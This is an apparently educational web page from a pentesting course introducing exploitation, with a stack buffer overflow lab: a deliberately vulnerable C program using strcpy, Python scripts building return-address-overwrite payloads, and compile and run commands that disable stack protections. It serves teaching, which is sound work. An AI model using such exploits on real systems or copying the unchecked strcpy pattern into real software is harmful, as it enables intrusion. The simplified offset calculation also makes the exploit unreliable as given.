<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Introduction to Exploitation</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/04-01-introduccion-explotacion" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/04-01-introduccion-explotacion" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/04-01-introduccion-explotacion" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo-header_enterprise.png"></a>
			</h1>
		</div>
		<div class="col-12 col-md-4 p-0 text-end">
			<h2 id="main_title"><cite>Building today's and tomorrow's society</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
													<b id="lit_lang_es" class="px-2">EN</b>
				|
				<a href="https://campusempresa.com/mod/pentesting/04-01-introduccion-explotacion" class="px-2">ES</a></b>
				|
				<a href="https://campusempresa.cat/mod/pentesting/04-01-introduccion-explotacion" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">The Project</a>
				<a href="/about">About Us</a>
				<a href="/contribute">Contribute</a>
				<a href="/donate">Donations</a>
				<a href="/licence">License</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
								<div class='row navigation'>
	<div class='col-2'>
					<a href='03-03-deteccion-de-vulnerabilidades' title="Vulnerability Detection">&#x25C4;Previous</a>
			</div>
	<div class='col-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Introduction to Exploitation</h2></a>
			</div>
	<div class='col-2 text-end'>
					<a href='04-02-explotacion-web' title="Exploitation of Web Vulnerabilities">Next &#x25BA;</a>
			</div>
</div>
<div class='content'></div><h1>Overview</h1>
<div class='content'><p>In this module, we will delve into the exploitation phase of penetration testing. Exploitation is the process of taking advantage of identified vulnerabilities to gain unauthorized access to systems, applications, or networks. This phase is crucial as it demonstrates the potential impact of vulnerabilities and helps in understanding the security posture of the target environment.</p>
</div><h1>Key Concepts</h1>
<div class='content'><ol>
<li>
<p><strong>Exploitation Basics</strong>:</p>
<ul>
<li>Definition: Exploitation involves leveraging vulnerabilities to execute arbitrary code, gain elevated privileges, or access sensitive data.</li>
<li>Objective: The main goal is to demonstrate the risk associated with the vulnerability by gaining some level of control over the target system.</li>
</ul>
</li>
<li>
<p><strong>Types of Exploits</strong>:</p>
<ul>
<li><strong>Remote Exploits</strong>: Attacks that can be executed from a remote location without physical access to the target system.</li>
<li><strong>Local Exploits</strong>: Attacks that require local access to the target system to be executed.</li>
<li><strong>Client-Side Exploits</strong>: Attacks that target client applications, such as web browsers or email clients, often through social engineering.</li>
</ul>
</li>
<li>
<p><strong>Exploit Development</strong>:</p>
<ul>
<li>Understanding the vulnerability: Analyzing the root cause of the vulnerability.</li>
<li>Crafting the payload: Creating a payload that will be executed upon successful exploitation.</li>
<li>Testing the exploit: Ensuring the exploit works reliably and does not crash the target system.</li>
</ul>
</li>
</ol>
</div><h1>Practical Example</h1>
<div class='content'></div><h2>Example: Exploiting a Buffer Overflow Vulnerability</h2>
<div class='content'><p>A buffer overflow occurs when more data is written to a buffer than it can hold, potentially allowing an attacker to overwrite adjacent memory.</p>
<h4>Step-by-Step Guide</h4>
<ol>
<li>
<p><strong>Identify the Vulnerability</strong>:</p>
<ul>
<li>Use a vulnerability scanner or manual analysis to identify a buffer overflow vulnerability in a target application.</li>
</ul>
</li>
<li>
<p><strong>Analyze the Vulnerability</strong>:</p>
<ul>
<li>Determine the exact point of overflow and the impact on the application.</li>
<li>Example: A vulnerable function in a C program:
<pre><code class="language-c">void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input); // No bounds checking
}
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Craft the Exploit</strong>:</p>
<ul>
<li>Create an input that overflows the buffer and overwrites the return address to point to our payload.</li>
<li>Example payload to spawn a shell:
<pre><code class="language-python"># Exploit script
import struct

buffer_size = 64
overflow = &quot;A&quot; * buffer_size
return_address = struct.pack(&quot;&lt;I&quot;, 0xdeadbeef)  # Address to jump to
payload = overflow + return_address

print(payload)
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Execute the Exploit</strong>:</p>
<ul>
<li>Run the exploit against the target application to gain control.</li>
<li>Example command:
<pre><code class="language-bash">./vulnerable_program $(python exploit.py)
</code></pre>
</li>
</ul>
</li>
</ol>
</div><h1>Practical Exercise</h1>
<div class='content'></div><h2>Exercise: Exploiting a Simple Buffer Overflow</h2>
<div class='content'><h4>Objective:</h4>
<p>Exploit a buffer overflow vulnerability in a provided C program to gain control of the execution flow.</p>
<h4>Provided Code:</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KCnZvaWQgc2VjcmV0X2Z1bmN0aW9uKCkgewogICAgcHJpbnRmKCJZb3UgaGF2ZSBzdWNjZXNzZnVsbHkgZXhwbG9pdGVkIHRoZSBidWZmZXIgb3ZlcmZsb3chXG4iKTsKfQoKdm9pZCB2dWxuZXJhYmxlX2Z1bmN0aW9uKGNoYXIgKmlucHV0KSB7CiAgICBjaGFyIGJ1ZmZlcls2NF07CiAgICBzdHJjcHkoYnVmZmVyLCBpbnB1dCk7IC8vIE5vIGJvdW5kcyBjaGVja2luZwp9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7CiAgICBpZiAoYXJnYyA8IDIpIHsKICAgICAgICBwcmludGYoIlVzYWdlOiAlcyA8aW5wdXQ+XG4iLCBhcmd2WzBdKTsKICAgICAgICByZXR1cm4gMTsKICAgIH0KICAgIHZ1bG5lcmFibGVfZnVuY3Rpb24oYXJndlsxXSk7CiAgICByZXR1cm4gMDsKfQ=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void secret_function() {
    printf(&quot;You have successfully exploited the buffer overflow!\n&quot;);
}

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input); // No bounds checking
}

int main(int argc, char *argv[]) {
    if (argc &lt; 2) {
        printf(&quot;Usage: %s &lt;input&gt;\n&quot;, argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}</pre></div><div class='content'><h4>Steps:</h4>
<ol>
<li>Compile the provided C program.</li>
<li>Analyze the code to identify the buffer overflow vulnerability.</li>
<li>Craft an exploit to overwrite the return address and redirect execution to <code>secret_function</code>.</li>
<li>Execute the exploit and verify the output.</li>
</ol>
<h4>Solution:</h4>
<ol>
<li>
<p><strong>Compile the Program</strong>:</p>
<pre><code class="language-bash">gcc -o vulnerable_program vulnerable_program.c -fno-stack-protector -z execstack
</code></pre>
</li>
<li>
<p><strong>Analyze the Code</strong>:</p>
<ul>
<li>The <code>strcpy</code> function does not check the length of the input, leading to a buffer overflow.</li>
</ul>
</li>
<li>
<p><strong>Craft the Exploit</strong>:</p>
<ul>
<li>Calculate the offset to the return address.</li>
<li>Overwrite the return address with the address of <code>secret_function</code>.</li>
</ul>
<p>Example Python script:</p>
<pre><code class="language-python">import struct

buffer_size = 64
overflow = &quot;A&quot; * buffer_size
secret_function_address = struct.pack(&quot;&lt;I&quot;, 0x080484b6)  # Replace with actual address
payload = overflow + secret_function_address

print(payload)
</code></pre>
</li>
<li>
<p><strong>Execute the Exploit</strong>:</p>
<pre><code class="language-bash">./vulnerable_program $(python exploit.py)
</code></pre>
</li>
</ol>
<h4>Expected Output:</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("WW91IGhhdmUgc3VjY2Vzc2Z1bGx5IGV4cGxvaXRlZCB0aGUgYnVmZmVyIG92ZXJmbG93IQ=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>You have successfully exploited the buffer overflow!</pre></div><div class='content'></div><h1>Common Mistakes and Tips</h1>
<div class='content'><ul>
<li><strong>Incorrect Address Calculation</strong>: Ensure the address used in the exploit is correct and properly formatted.</li>
<li><strong>Buffer Size Miscalculation</strong>: Double-check the buffer size and the offset to the return address.</li>
<li><strong>Testing in a Controlled Environment</strong>: Always test exploits in a controlled and legal environment to avoid unintended consequences.</li>
</ul>
</div><h1>Conclusion</h1>
<div class='content'><p>In this section, we covered the basics of exploitation, including the types of exploits and the process of developing an exploit. We also walked through a practical example of exploiting a buffer overflow vulnerability. Understanding these concepts is crucial for effectively demonstrating the impact of vulnerabilities during a penetration test. In the next sections, we will explore specific types of vulnerabilities and their exploitation in more detail.</p>
</div><div class='row navigation'>
	<div class='col-2'>
					<a href='03-03-deteccion-de-vulnerabilidades' title="Vulnerability Detection">&#x25C4;Previous</a>
			</div>
	<div class='col-8 text-center'>
			</div>
	<div class='col-2 text-end'>
					<a href='04-02-explotacion-web' title="Exploitation of Web Vulnerabilities">Next &#x25BA;</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Advertising</h1>
			<p>This space is reserved for advertising.</p>
			<p>If you want to be a sponsor, contact us to include links in this area: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Thank you for collaborating!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Accept</a>
    <a href="/cookies">More Information</a>
</div>	

	</div>    
</body>
</html>
